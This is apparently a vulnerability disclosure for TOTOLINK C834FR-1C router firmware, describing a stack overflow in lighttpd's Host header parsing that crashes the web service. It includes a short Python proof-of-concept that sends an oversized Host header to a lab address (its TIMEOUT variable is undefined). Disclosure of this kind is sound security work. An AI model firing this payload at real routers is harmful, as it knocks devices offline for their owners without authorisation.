# Information

**Vendor of the products:** TOTOLINK

**Vendor's website:** [TOTOLINK](https://www.totolink.net/)

**Reported by:  **chengsihan(2216760375@qq.com)

**Affected products:** C834FR-1C (NR1800X)

**Affected firmware version:** V9.1.0u.6279_B20210910 (observed in local lab)

**Firmware download address:** https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/225/ids/36.html

# Overview

A stack overflow vulnerability exists in `lighttpd` request parsing logic of the target firmware.
An unauthenticated attacker can send an overlong `Host` header to trigger memory corruption in the HTTP parser path:

- `http_request_parse` (`0x411fb0`)

![image-20260414191537967](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142013449.png)

![image-20260414191547705](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142013451.png)

- calls `find_host_ip` (`0x411d78`)

![image-20260414191553000](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142013452.png)

- data is copied into a small stack buffer (`v113[32]`) without proper bounds checks

In practice, sending a large Host header causes the web service to crash (DoS).  
In the lab, this is observable as `ConnectionRefused` after attack and `qemu ... Segmentation fault` in runtime logs.

# Vulnerability details

1. Entry point is normal HTTP request handling in `http_request_parse`.
2. `Host` header value is extracted and forwarded to `find_host_ip`.
3. `find_host_ip` performs byte-copy behavior without strict length validation.
4. Destination in caller is a small stack buffer (`char v113[32]`), leading to stack overwrite risk.
5. Sending long `Host` values (for example 512+ bytes) reliably destabilizes or crashes the service in this firmware/lab setup.

# POC



```http
#!/usr/bin/env python3
import socket


TARGET = "192.168.211.128"
PORT = 80
PATH = "/formLoginAuth.htm?authCode=1&action=login"


def send_once(host_value: str):
    req = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {host_value}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    with socket.create_connection((TARGET, PORT), timeout=TIMEOUT) as s:
        s.sendall(req)
        


payload = "A" * 0x400
send_once(payload)


```

# effect

Expected behavior during exploitation:

1. Before attack, target web service answers normally (`302` on `/formLoginAuth.htm?...`).

2. After sending long Host headers, service becomes unavailable (`ConnectionRefused`).

   before execution

   ![image-20260414191326359](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142013453.png)

after execution

![image-20260414191714777](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142013454.png)
